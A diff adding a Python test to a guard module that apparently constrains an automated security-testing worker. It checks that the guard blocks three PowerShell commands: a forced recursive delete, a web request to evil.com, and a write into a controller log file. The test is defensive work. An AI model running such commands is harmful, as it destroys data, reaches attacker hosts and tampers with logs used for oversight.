@@ -79,3 +79,14 @@ def test_from_engagement():
     g = Guard.from_engagement({"scope": {"allow": ["a.com"], "deny": ["b.a.com"]}})
     assert g.check_url("https://b.a.com/").ok is False
     assert g.check_url("https://a.com/").ok
+
+
+def test_powershell_tool_covered():
+    """Windows worker 实测用 PowerShell 工具（P4.9）——命令类检查必须覆盖。"""
+    g = _g()
+    v = g.check_tool("PowerShell", {"command": "Remove-Item -Recurse -Force .at1"})
+    assert not v.ok and v.kind == "self_destruct"
+    v2 = g.check_tool("PowerShell", {"command": "Invoke-WebRequest https://evil.com/x"})
+    assert not v2.ok and v2.kind == "scope"
+    v3 = g.check_tool("PowerShell", {"command": "Add-Content ../state/log.jsonl 'x'"})
+    assert not v3.ok and v3.kind == "controller_zone"
